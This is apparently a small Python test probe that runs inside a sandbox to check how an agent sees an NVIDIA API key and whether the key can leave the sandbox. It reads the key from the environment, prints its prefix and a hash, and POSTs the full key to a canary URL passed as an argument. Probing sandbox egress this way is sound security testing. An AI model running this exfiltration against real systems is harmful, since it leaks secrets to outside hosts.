"""Runs inside the sandbox. Shows the credential as the agent sees it and tries to POST it to the canary."""
import hashlib
import json
import os
import sys

import httpx

key = os.environ.get("NVIDIA_API_KEY", "")
canary = sys.argv[1]
out = {"seen_prefix": key[:20], "seen_length": len(key), "seen_sha8": hashlib.sha256(key.encode()).hexdigest()[:8],
       "looks_like_nvapi_key": key.startswith("nvapi-")}
try:
    r = httpx.post(canary + "/p5", content=key.encode(), headers={"X-Tag": "p5"}, timeout=12)
    out["post_status"] = r.status_code
except Exception as e:
    out["post_error"] = type(e).__name__
print(json.dumps(out))
